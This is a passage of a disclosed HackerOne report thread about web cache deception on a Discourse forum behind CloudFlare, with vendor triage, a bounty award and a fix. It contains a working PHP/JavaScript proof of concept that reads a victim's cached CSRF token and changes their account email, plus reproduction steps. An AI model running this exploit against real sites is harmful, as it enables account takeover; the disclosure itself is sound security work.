<span class=\"nv\">$matches</span><span class=\"p\">[</span><span class=\"mi\">1</span><span class=\"p\">]</span><span class=\"o\">.</span><span class=\"s1\">&#39;;&#39;</span><span class=\"o\">.</span><span class=\"nv\">$name_matches</span><span class=\"p\">[</span><span class=\"mi\">1</span><span class=\"p\">];</span>\n    <span class=\"p\">}</span> <span class=\"k\">else</span> <span class=\"p\">{</span>\n        <span class=\"k\">echo</span> <span class=\"s1\">&#39;error&#39;</span><span class=\"p\">;</span>\n    <span class=\"p\">}</span>\n    <span class=\"k\">exit</span><span class=\"p\">;</span>\n<span class=\"p\">}</span>\n<span class=\"c1\">#random file to taint with csrf-token\n</span><span class=\"nv\">$rand</span> <span class=\"o\">=</span> <span class=\"nb\">mt_rand</span><span class=\"p\">(</span><span class=\"mi\">100000</span><span class=\"p\">,</span><span class=\"mi\">999999</span><span class=\"p\">);</span>\n<span class=\"nv\">$file</span> <span class=\"o\">=</span> <span class=\"nb\">sprintf</span><span class=\"p\">(</span><span class=\"nv\">$file</span><span class=\"p\">,</span> <span class=\"nv\">$rand</span><span class=\"p\">);</span>\n<span class=\"cp\">?&gt;</span>\n<span class=\"nt\">&lt;html&gt;</span>\n  <span class=\"nt\">&lt;body&gt;</span>\n    <span class=\"nt\">&lt;img</span> <span class=\"na\">src=</span><span class=\"s\">&quot;</span><span class=\"cp\">&lt;?=</span><span class=\"nv\">$discourse</span><span class=\"o\">.</span><span class=\"nv\">$file</span><span class=\"cp\">?&gt;</span><span class=\"s\">&quot;</span> <span class=\"nt\">/&gt;</span>\n    <span class=\"nt\">&lt;img</span> <span class=\"na\">src=</span><span class=\"s\">&quot;</span><span class=\"cp\">&lt;?=</span><span class=\"nv\">$discourse</span><span class=\"o\">.</span><span class=\"nv\">$file</span><span class=\"cp\">?&gt;</span><span class=\"s\">&quot;</span> <span class=\"nt\">/&gt;</span>\n    <span class=\"nt\">&lt;img</span> <span class=\"na\">src=</span><span class=\"s\">&quot;</span><span class=\"cp\">&lt;?=</span><span class=\"nv\">$discourse</span><span class=\"o\">.</span><span class=\"nv\">$file</span><span class=\"cp\">?&gt;</span><span class=\"s\">&quot;</span> <span class=\"na\">onerror=</span><span class=\"s\">&quot;f()&quot;</span> <span class=\"nt\">/&gt;</span>\n<span class=\"nt\">&lt;script&gt;</span><span class=\"err\">\nvar user = &#39;&#39;, change_email_to = &#39;</span><span class=\"cp\">&lt;?=</span><span class=\"nv\">$email_to_change_to</span><span class=\"cp\">?&gt;</span><span class=\"err\">&#39;;\nfunction f() {\n    fetch(&#39;?fetch=1&amp;f=</span><span class=\"cp\">&lt;?=</span><span class=\"nv\">$rand</span><span class=\"cp\">?&gt;</span><span class=\"err\">&#39;).then(function(e){return e.text()}).then(function(e){\n        if(e == &#39;error&#39;) { alert(&#39;You are currently running the PHP on a different Cloudflare region&#39;); return; }\n        user = e.split(&#39;;&#39;)[1];\n        document.getElementById(&#39;f&#39;).action = &#39;</span><span class=\"cp\">&lt;?=</span><span class=\"nv\">$discourse</span><span class=\"cp\">?&gt;</span><span class=\"err\">/users/&#39;+user+&#39;/preferences/email&#39;\n        submitRequest(e.split(&#39;;&#39;)[0])\n    })\n}\nfunction submitRequest(csrf) {\n  var xhr = new XMLHttpRequest();\n  xhr.onerror = function () {\n    console.log(xhr.readyState)\n    if(xhr.readyState == 4) {\n        alert(&#39;Account email for &#39; + user + &#39; has been changed to: &#39; + change_email_to);\n    }\n  };\n  xhr.open(&quot;POST&quot;, &quot;</span><span class=\"cp\">&lt;?=</span><span class=\"nv\">$discourse</span><span class=\"cp\">?&gt;</span><span class=\"o\">/</span><span class=\"nx\">users</span><span class=\"o\">/</span><span class=\"s2\">&quot;+user+&quot;</span><span class=\"o\">/</span><span class=\"nx\">preferences</span><span class=\"o\">/</span><span class=\"nx\">email</span><span class=\"p\">.</span><span class=\"nx\">json</span><span class=\"s2\">&quot;, true);\n  xhr.setRequestHeader(&quot;</span><span class=\"nx\">Accept</span><span class=\"s2\">&quot;, &quot;</span><span class=\"nx\">text</span><span class=\"err\">\\</span><span class=\"o\">/</span><span class=\"nx\">html</span><span class=\"s2\">&quot;);\n  xhr.setRequestHeader(&quot;</span><span class=\"nx\">Content</span><span class=\"o\">-</span><span class=\"nx\">Type</span><span class=\"s2\">&quot;, &quot;</span><span class=\"nx\">application</span><span class=\"err\">\\</span><span class=\"o\">/</span><span class=\"nx\">x</span><span class=\"o\">-</span><span class=\"nx\">www</span><span class=\"o\">-</span><span class=\"nx\">form</span><span class=\"o\">-</span><span class=\"nx\">urlencoded</span><span class=\"s2\">&quot;);\n  xhr.withCredentials = true;\n  var body = &quot;</span><span class=\"nx\">_method</span><span class=\"o\">=</span><span class=\"nx\">PUT</span><span class=\"o\">&amp;</span><span class=\"nx\">email</span><span class=\"o\">=</span><span class=\"s2\">&quot; + encodeURIComponent(change_email_to) +&quot;</span><span class=\"o\">&amp;</span><span class=\"nx\">authenticity_token</span><span class=\"o\">=</span><span class=\"err\">&quot;</span> <span class=\"o\">+</span> <span class=\"nb\">encodeURIComponent</span><span class=\"p\">(</span><span class=\"nx\">csrf</span><span class=\"p\">);</span>\n  <span class=\"kd\">var</span> <span class=\"nx\">aBody</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"nx\">Uint8Array</span><span class=\"p\">(</span><span class=\"nx\">body</span><span class=\"p\">.</span><span class=\"nx\">length</span><span class=\"p\">);</span>\n  <span class=\"k\">for</span> <span class=\"p\">(</span><span class=\"kd\">var</span> <span class=\"nx\">i</span> <span class=\"o\">=</span> <span class=\"mi\">0</span><span class=\"p\">;</span> <span class=\"nx\">i</span> <span class=\"o\">&lt;</span> <span class=\"nx\">aBody</span><span class=\"p\">.</span><span class=\"nx\">length</span><span class=\"p\">;</span> <span class=\"nx\">i</span><span class=\"o\">++</span><span class=\"p\">)</span>\n    <span class=\"nx\">aBody</span><span class=\"p\">[</span><span class=\"nx\">i</span><span class=\"p\">]</span> <span class=\"o\">=</span> <span class=\"nx\">body</span><span class=\"p\">.</span><span class=\"nx\">charCodeAt</span><span class=\"p\">(</span><span class=\"nx\">i</span><span class=\"p\">);</span> \n  <span class=\"nx\">xhr</span><span class=\"p\">.</span><span class=\"nx\">send</span><span class=\"p\">(</span><span class=\"k\">new</span> <span class=\"nx\">Blob</span><span class=\"p\">([</span><span class=\"nx\">aBody</span><span class=\"p\">]));</span>\n<span class=\"p\">}</span>\n<span class=\"nt\">&lt;/script&gt;</span>\n    <span class=\"nt\">&lt;form</span> <span class=\"na\">action=</span><span class=\"s\">&quot;&quot;</span> <span class=\"na\">id=</span><span class=\"s\">&quot;f&quot;</span> <span class=\"na\">method=</span><span class=\"s\">&quot;POST&quot;</span><span class=\"nt\">&gt;</span>\n      <span class=\"nt\">&lt;input</span> <span class=\"na\">type=</span><span class=\"s\">&quot;hidden&quot;</span> <span class=\"na\">name=</span><span class=\"s\">&quot;&amp;#95;method&quot;</span> <span class=\"na\">value=</span><span class=\"s\">&quot;PUT&quot;</span> <span class=\"nt\">/&gt;</span>\n      <span class=\"nt\">&lt;input</span> <span class=\"na\">type=</span><span class=\"s\">&quot;hidden&quot;</span> <span class=\"na\">name=</span><span class=\"s\">&quot;email&quot;</span> <span class=\"na\">value=</span><span class=\"s\">&quot;</span><span class=\"cp\">&lt;?=</span><span class=\"nv\">$email_to_change_to</span><span class=\"cp\">?&gt;</span><span class=\"s\">&quot;</span> <span class=\"nt\">/&gt;</span>\n      <span class=\"nt\">&lt;input</span> <span class=\"na\">type=</span><span class=\"s\">&quot;hidden&quot;</span> <span class=\"na\">name=</span><span class=\"s\">&quot;authenticity&amp;#95;token&quot;</span> <span class=\"na\">id=</span><span class=\"s\">&quot;csrf&quot;</span> <span class=\"na\">value=</span><span class=\"s\">&quot;&quot;</span> <span class=\"nt\">/&gt;</span>\n      <span class=\"nt\">&lt;input</span> <span class=\"na\">type=</span><span class=\"s\">&quot;submit&quot;</span> <span class=\"na\">style=</span><span class=\"s\">&quot;display: none;&quot;</span> <span class=\"na\">value=</span><span class=\"s\">&quot;Submit request&quot;</span> <span class=\"nt\">/&gt;</span>\n      Please wait...\n    <span class=\"nt\">&lt;/form&gt;</span>\n  <span class=\"nt\">&lt;/body&gt;</span>\n<span class=\"nt\">&lt;/html&gt;</span>\n</code></pre>\n<p>And the flow looks like this:</p>\n\n<ol>\n<li>Sign up for Algolia at <a title=\"https://www.algolia.com/users/sign_up\" href=\"/redirect?signature=ab844cb743e2ae6e2f3ff1f8265250a3804c957c&amp;url=https%3A%2F%2Fwww.algolia.com%2Fusers%2Fsign_up\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://www.algolia.com/users/sign_up</span><i class=\"icon-external-link\"></i></a>\n</li>\n<li>When done, go to <a title=\"https://discourse.algolia.com/\" href=\"/redirect?signature=b773cbefaf62851a05a67e5c30a586bdd74edc42&amp;url=https%3A%2F%2Fdiscourse.algolia.com%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://discourse.algolia.com/</span><i class=\"icon-external-link\"></i></a> and &quot;Log in&quot;</li>\n<li>Make sure the PHP-file is running on the same CloudFlare region, you can try it locally by: <code>php -S localhost:8000 algolia.php</code>\n</li>\n<li>Change the email address in the PHP-script to something else maybe, so you see that you indeed get the confirmation email sent to the new address to confirm the change.</li>\n<li>Go to <code>http://localhost:8000</code> in Firefox.</li>\n</ol>\n\n<p>You should see an alert that the email was changed. This is also the point when the attacker gets a &quot;Confirm your new address&quot; to their inbox as my video shows.</p>\n\n<p>PoC-video:<br>\n<a href=\"#\" class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"AlgoliaTakeover.mp4\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/253/981/8531fd700671a5b86646925d06969b7af7670bf0/AlgoliaTakeover.mp4?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQWYI2GPWO%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T221812Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA8aDGZ9hZPNXy0op0dbUCK3A2FIHB%2BibDXwZCFl83WTNlShweklDkKhtUNsdiH1ZDSlGSdLObBpyGJdCeuHTlImqCYdt8f2yBKifOTf2TivYpJrNHupdtHvnqAWi7W9%2BjwJ%2BTCwiOrcStmIDnFCyyqwY6TAI5WG5MrEEDv8wrLdp996xp151lj%2F4um2Zv496W8ro76jvQ88joGdHpQVXnNfV1GVszM9x2MSCQxnQNnSXcnSWseYTKLzyFp0ZHOTPrPzq2uSlVkK%2F3QymE%2FxPIDTGw0YAH0dkxUT6j5w6dpcr%2BrzhYkptWupenUAF0MVqKJxNJZkBP3vJojReAQxLLf6Q5HsYqGm6jhS4748ZyTRZgChKL9lshIjpbjIu5MbLvwX%2F27PaXT7zSgwK903viGfy%2Bho9qoZUssvAToQJIzp0gqB8TNCETjgLLeFaQk13faNP%2Bs6DczQQAjcVHP0T4iXvprpJ7WF4Lgvdg6C%2FwSgLkD8N%2BofGZQflIFdduF6tbfUDe6RZqExPuAHXZR8zPF7DVwtnOckvWNNJFfV2j3cG1J4PetkJkxnwBNpnZP4nCyTKbwMPXXPODGNKYyXAqp3Qy95YBxWsTYos6qm4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=9be7e2f54f233b231dca54e78d241e353d81d3f9c27898afb751028e987130e5\" data-attachment-type=\"video/mp4\"><video controls=\"controls\" src=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/253/981/8531fd700671a5b86646925d06969b7af7670bf0/AlgoliaTakeover.mp4?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQWYI2GPWO%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T221812Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA8aDGZ9hZPNXy0op0dbUCK3A2FIHB%2BibDXwZCFl83WTNlShweklDkKhtUNsdiH1ZDSlGSdLObBpyGJdCeuHTlImqCYdt8f2yBKifOTf2TivYpJrNHupdtHvnqAWi7W9%2BjwJ%2BTCwiOrcStmIDnFCyyqwY6TAI5WG5MrEEDv8wrLdp996xp151lj%2F4um2Zv496W8ro76jvQ88joGdHpQVXnNfV1GVszM9x2MSCQxnQNnSXcnSWseYTKLzyFp0ZHOTPrPzq2uSlVkK%2F3QymE%2FxPIDTGw0YAH0dkxUT6j5w6dpcr%2BrzhYkptWupenUAF0MVqKJxNJZkBP3vJojReAQxLLf6Q5HsYqGm6jhS4748ZyTRZgChKL9lshIjpbjIu5MbLvwX%2F27PaXT7zSgwK903viGfy%2Bho9qoZUssvAToQJIzp0gqB8TNCETjgLLeFaQk13faNP%2Bs6DczQQAjcVHP0T4iXvprpJ7WF4Lgvdg6C%2FwSgLkD8N%2BofGZQflIFdduF6tbfUDe6RZqExPuAHXZR8zPF7DVwtnOckvWNNJFfV2j3cG1J4PetkJkxnwBNpnZP4nCyTKbwMPXXPODGNKYyXAqp3Qy95YBxWsTYos6qm4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=9be7e2f54f233b231dca54e78d241e353d81d3f9c27898afb751028e987130e5\" class=\"markdown-inline-image\"></video></a></p>\n\n<p>The reason why all this works to refresh everyones memory on this bug, is that any path under <code>/u/*.css</code> will respond when signed in with CSRF-tokens in the error page. Since there are no proper Cache-Control headers on this 404 page, CloudFlare will happily cache the file since it thinks it&#39;s a CSS-file. If there would be a <code>Cache-Control: no-cache</code> whenever CSRF-tokens are in the templates, this attack would not work.</p>\n\n<p>Also, to show you that it does in fact get cached on CloudFlare, here are the same URL tried in my region, and all of them are showing the user&#39;s CSRF-token when the file was requested, which is the one I&#39;m using to trigger the email-change:</p>\n\n<p><a href=\"#\" class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"Screen_Shot_2018-01-14_at_23.44.51.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/253/980/47ff68d15e126d4585771322bb6e2e3ca79d1961/Screen_Shot_2018-01-14_at_23.44.51.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQWYI2GPWO%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T221812Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA8aDGZ9hZPNXy0op0dbUCK3A2FIHB%2BibDXwZCFl83WTNlShweklDkKhtUNsdiH1ZDSlGSdLObBpyGJdCeuHTlImqCYdt8f2yBKifOTf2TivYpJrNHupdtHvnqAWi7W9%2BjwJ%2BTCwiOrcStmIDnFCyyqwY6TAI5WG5MrEEDv8wrLdp996xp151lj%2F4um2Zv496W8ro76jvQ88joGdHpQVXnNfV1GVszM9x2MSCQxnQNnSXcnSWseYTKLzyFp0ZHOTPrPzq2uSlVkK%2F3QymE%2FxPIDTGw0YAH0dkxUT6j5w6dpcr%2BrzhYkptWupenUAF0MVqKJxNJZkBP3vJojReAQxLLf6Q5HsYqGm6jhS4748ZyTRZgChKL9lshIjpbjIu5MbLvwX%2F27PaXT7zSgwK903viGfy%2Bho9qoZUssvAToQJIzp0gqB8TNCETjgLLeFaQk13faNP%2Bs6DczQQAjcVHP0T4iXvprpJ7WF4Lgvdg6C%2FwSgLkD8N%2BofGZQflIFdduF6tbfUDe6RZqExPuAHXZR8zPF7DVwtnOckvWNNJFfV2j3cG1J4PetkJkxnwBNpnZP4nCyTKbwMPXXPODGNKYyXAqp3Qy95YBxWsTYos6qm4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=42c2e44a443d58dc6e2e9621b26995a9ed2e0aa229ec0a48d8a6a07cfeb08dae\" data-attachment-type=\"image/png\"><img src=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/253/980/47ff68d15e126d4585771322bb6e2e3ca79d1961/Screen_Shot_2018-01-14_at_23.44.51.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQWYI2GPWO%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T221812Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA8aDGZ9hZPNXy0op0dbUCK3A2FIHB%2BibDXwZCFl83WTNlShweklDkKhtUNsdiH1ZDSlGSdLObBpyGJdCeuHTlImqCYdt8f2yBKifOTf2TivYpJrNHupdtHvnqAWi7W9%2BjwJ%2BTCwiOrcStmIDnFCyyqwY6TAI5WG5MrEEDv8wrLdp996xp151lj%2F4um2Zv496W8ro76jvQ88joGdHpQVXnNfV1GVszM9x2MSCQxnQNnSXcnSWseYTKLzyFp0ZHOTPrPzq2uSlVkK%2F3QymE%2FxPIDTGw0YAH0dkxUT6j5w6dpcr%2BrzhYkptWupenUAF0MVqKJxNJZkBP3vJojReAQxLLf6Q5HsYqGm6jhS4748ZyTRZgChKL9lshIjpbjIu5MbLvwX%2F27PaXT7zSgwK903viGfy%2Bho9qoZUssvAToQJIzp0gqB8TNCETjgLLeFaQk13faNP%2Bs6DczQQAjcVHP0T4iXvprpJ7WF4Lgvdg6C%2FwSgLkD8N%2BofGZQflIFdduF6tbfUDe6RZqExPuAHXZR8zPF7DVwtnOckvWNNJFfV2j3cG1J4PetkJkxnwBNpnZP4nCyTKbwMPXXPODGNKYyXAqp3Qy95YBxWsTYos6qm4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=42c2e44a443d58dc6e2e9621b26995a9ed2e0aa229ec0a48d8a6a07cfeb08dae\" class=\"markdown-inline-image\"></a><br>\n<a href=\"#\" class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"Screen_Shot_2018-01-14_at_23.44.58.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/253/979/852c304f53383523085e98d88e73b8563c3239fe/Screen_Shot_2018-01-14_at_23.44.58.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQWYI2GPWO%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T221812Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA8aDGZ9hZPNXy0op0dbUCK3A2FIHB%2BibDXwZCFl83WTNlShweklDkKhtUNsdiH1ZDSlGSdLObBpyGJdCeuHTlImqCYdt8f2yBKifOTf2TivYpJrNHupdtHvnqAWi7W9%2BjwJ%2BTCwiOrcStmIDnFCyyqwY6TAI5WG5MrEEDv8wrLdp996xp151lj%2F4um2Zv496W8ro76jvQ88joGdHpQVXnNfV1GVszM9x2MSCQxnQNnSXcnSWseYTKLzyFp0ZHOTPrPzq2uSlVkK%2F3QymE%2FxPIDTGw0YAH0dkxUT6j5w6dpcr%2BrzhYkptWupenUAF0MVqKJxNJZkBP3vJojReAQxLLf6Q5HsYqGm6jhS4748ZyTRZgChKL9lshIjpbjIu5MbLvwX%2F27PaXT7zSgwK903viGfy%2Bho9qoZUssvAToQJIzp0gqB8TNCETjgLLeFaQk13faNP%2Bs6DczQQAjcVHP0T4iXvprpJ7WF4Lgvdg6C%2FwSgLkD8N%2BofGZQflIFdduF6tbfUDe6RZqExPuAHXZR8zPF7DVwtnOckvWNNJFfV2j3cG1J4PetkJkxnwBNpnZP4nCyTKbwMPXXPODGNKYyXAqp3Qy95YBxWsTYos6qm4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=22fbb0d2a4dfc77ae6331ad9c90f471f1d2f34fb825cc0125c633e6063ceb4d8\" data-attachment-type=\"image/png\"><img src=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/253/979/852c304f53383523085e98d88e73b8563c3239fe/Screen_Shot_2018-01-14_at_23.44.58.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQWYI2GPWO%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T221812Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA8aDGZ9hZPNXy0op0dbUCK3A2FIHB%2BibDXwZCFl83WTNlShweklDkKhtUNsdiH1ZDSlGSdLObBpyGJdCeuHTlImqCYdt8f2yBKifOTf2TivYpJrNHupdtHvnqAWi7W9%2BjwJ%2BTCwiOrcStmIDnFCyyqwY6TAI5WG5MrEEDv8wrLdp996xp151lj%2F4um2Zv496W8ro76jvQ88joGdHpQVXnNfV1GVszM9x2MSCQxnQNnSXcnSWseYTKLzyFp0ZHOTPrPzq2uSlVkK%2F3QymE%2FxPIDTGw0YAH0dkxUT6j5w6dpcr%2BrzhYkptWupenUAF0MVqKJxNJZkBP3vJojReAQxLLf6Q5HsYqGm6jhS4748ZyTRZgChKL9lshIjpbjIu5MbLvwX%2F27PaXT7zSgwK903viGfy%2Bho9qoZUssvAToQJIzp0gqB8TNCETjgLLeFaQk13faNP%2Bs6DczQQAjcVHP0T4iXvprpJ7WF4Lgvdg6C%2FwSgLkD8N%2BofGZQflIFdduF6tbfUDe6RZqExPuAHXZR8zPF7DVwtnOckvWNNJFfV2j3cG1J4PetkJkxnwBNpnZP4nCyTKbwMPXXPODGNKYyXAqp3Qy95YBxWsTYos6qm4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=22fbb0d2a4dfc77ae6331ad9c90f471f1d2f34fb825cc0125c633e6063ceb4d8\" class=\"markdown-inline-image\"></a></p>\n<pre class=\"highlight plaintext\"><code>local @ cache $ curl -s https://discourse.algolia.com/u/469843.css | grep csrf-token\n&lt;meta name=&quot;csrf-token&quot; content=&quot;CaTKE2wq4jczCZO+LTasy6SvBBHxaYJr9giqym1PSaCtgz5IgofUOmrufGYdrnTgS8ZHM67/SPgUAroHv1zMFw==&quot; /&gt;\n</code></pre>\n<p>The only setup Algolia made here was to put the Discourse-application behind CloudFlare. This is a regular setup if you&#39;re using CloudFlare&#39;s proxy to speed up the website and to hide the origin and sometimes make sure you&#39;re protected against DDoS.</p>\n\n<p>Hope this helps, and sorry for my late reply.</p>\n\n<p>Regards,<br>\nFrans</p>\n", 
            "type": "Activities::BugNew", 
            "id": 2284063, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2018-01-21T09:37:15.700Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-01-21T09:37:15.700Z", 
            "actor": {
                "username": "asuka", 
                "url": "/asuka", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/111/923/c73a42c0f9ea47ce5554fbab2411978f2bb985f8_medium.jpg?1474068574"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "discourse", 
            "message": "Great find @fransrosen! We've escalated this to the development team to see if this is something they would like to fix, and will get back to you as soon as we have any updates.\n\nKind regards,\n@asuka ", 
            "markdown_message": "<p>Great find <a href=\"/fransrosen\">@fransrosen</a>! We&#39;ve escalated this to the development team to see if this is something they would like to fix, and will get back to you as soon as we have any updates.</p>\n\n<p>Kind regards,<br>\n<a href=\"/asuka\">@asuka</a> </p>\n", 
            "type": "Activities::Comment", 
            "id": 2304532, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2018-01-31T22:24:55.285Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-01-31T22:27:01.875Z", 
            "actor": {
                "username": "discourse_team", 
                "url": "/discourse_team", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/130/970/76f3cfd34fef4a1016e28d7164ec35a6f2a7bbeb_medium.png?1534409795"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "discourse", 
            "message": "We view this as low priority but we do eventually want to make it so bad .css requests don't return 200.\n\n> The reason why all this works to refresh everyones memory on this bug, is that any path under `/u/*.css` will respond when signed in with CSRF-tokens in the error page", 
            "markdown_message": "<p>We view this as low priority but we do eventually want to make it so bad .css requests don&#39;t return 200.</p>\n\n<blockquote>\n<p>The reason why all this works to refresh everyones memory on this bug, is that any path under <code>/u/*.css</code> will respond when signed in with CSRF-tokens in the error page</p>\n</blockquote>\n", 
            "type": "Activities::Comment", 
            "id": 2340463, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2018-01-31T22:25:09.199Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-01-31T22:25:09.199Z", 
            "actor": {
                "username": "discourse_team", 
                "url": "/discourse_team", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/130/970/76f3cfd34fef4a1016e28d7164ec35a6f2a7bbeb_medium.png?1534409795"
                }, 
                "hackerone_triager": false
            }, 
            "additional_data": {
                "new_severity": "Low", 
                "old_severity": null
            }, 
            "team_handle": "discourse", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::ReportSeverityUpdated", 
            "id": 2340464, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2018-01-31T23:27:31.070Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-01-31T23:27:31.070Z", 
            "actor": {
                "username": "discourse_team", 
                "url": "/discourse_team", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/130/970/76f3cfd34fef4a1016e28d7164ec35a6f2a7bbeb_medium.png?1534409795"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "discourse", 
            "message": "We are not sure we can repro this? We are hitting `try.discourse.org/u/samsaffron/activity.css` and getting a response code of 406?\n\n```\njeff@WUMPUS:~$ curl -I https://try.discourse.org/u/samsaffron/activity.css\nHTTP/1.1 406 Not Acceptable\nServer: nginx/1.13.6\nDate: Wed, 31 Jan 2018 23:24:57 GMT\nContent-Type: text/html; charset=utf-8\nContent-Length: 0\nConnection: keep-alive\nX-Request-Id: c2757c97-24a1-484c-97a3-56d203acf8a5\nX-Runtime: 0.024248\nDiscourse-Proxy-ID: app-router-tiehunter01\nStrict-Transport-Security: max-age=31415926\n```\n\nIs the report specific to the redirect routes `/users` and `/my` then?", 
            "markdown_message": "<p>We are not sure we can repro this? We are hitting <code>try.discourse.org/u/samsaffron/activity.css</code> and getting a response code of 406?</p>\n<pre class=\"highlight plaintext\"><code>jeff@WUMPUS:~$ curl -I https://try.discourse.org/u/samsaffron/activity.css\nHTTP/1.1 406 Not Acceptable\nServer: nginx/1.13.6\nDate: Wed, 31 Jan 2018 23:24:57 GMT\nContent-Type: text/html; charset=utf-8\nContent-Length: 0\nConnection: keep-alive\nX-Request-Id: c2757c97-24a1-484c-97a3-56d203acf8a5\nX-Runtime: 0.024248\nDiscourse-Proxy-ID: app-router-tiehunter01\nStrict-Transport-Security: max-age=31415926\n</code></pre>\n<p>Is the report specific to the redirect routes <code>/users</code> and <code>/my</code> then?</p>\n", 
            "type": "Activities::BugNeedsMoreInfo", 
            "id": 2340637, 
            "genius_execution_id": null
        }, 
        {
            "bounty_currency": "usd", 
            "automated_response": false, 
            "created_at": "2018-02-01T21:29:02.981Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-02-01T21:29:41.834Z", 
            "actor": {
                "url": "/discourse", 
                "profile": {
                    "name": "Discourse"
                }, 
                "ibb": false, 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/016/893/2ee366d05b47833a98f06c29cd5318d1bb134e20_medium.?1481849067"
                }
            }, 
            "team_handle": "discourse", 
            "bonus_amount": "0.0", 
            "bounty_amount": "256.0", 
            "collaborator": {
                "username": "fransrosen", 
                "url": "/fransrosen"
            }, 
            "message": "We agree this was effectively a bug, we should not be returning 200 OK plus auth tokens for random URLs such as\n\n```\n/u/my/preferences.css\n/u/my/preferences/username.css\n/u/my/preferences/card-badge.css\n```\n\nAlthough the impact is low (effectively CloudFlare specific) I am awarding at the medium level because this was such a well written and researched report -- thank you!\n\nThis is also fixed in master / latest.\n", 
            "markdown_message": "<p>We agree this was effectively a bug, we should not be returning 200 OK plus auth tokens for random URLs such as</p>\n<pre class=\"highlight plaintext\"><code>/u/my/preferences.css\n/u/my/preferences/username.css\n/u/my/preferences/card-badge.css\n</code></pre>\n<p>Although the impact is low (effectively CloudFlare specific) I am awarding at the medium level because this was such a well written and researched report -- thank you!</p>\n\n<p>This is also fixed in master / latest.</p>\n", 
            "type": "Activities::BountyAwarded", 
            "id": 2343125, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2018-02-02T04:28:31.142Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-02-02T04:28:31.142Z", 
            "actor": {
                "username": "fransrosen", 
                "url": "/fransrosen", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/001/634/56528780ddde67dec2e6f9d1212879ab16bc8f4a_medium.jpg?1396468576"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "discourse", 
            "message": "Thank you!\nI haven't confirmed the fix yet but I have seen fixes been done by always serving Cache-Control: no-cache whenever the current user is signed in, as some cache settings in Cloudflare also allows caching 404 responses if no cache-header is present.\n\nGreat job, glad that it could get solved, sorry for the long delay of getting a proper PoC.", 
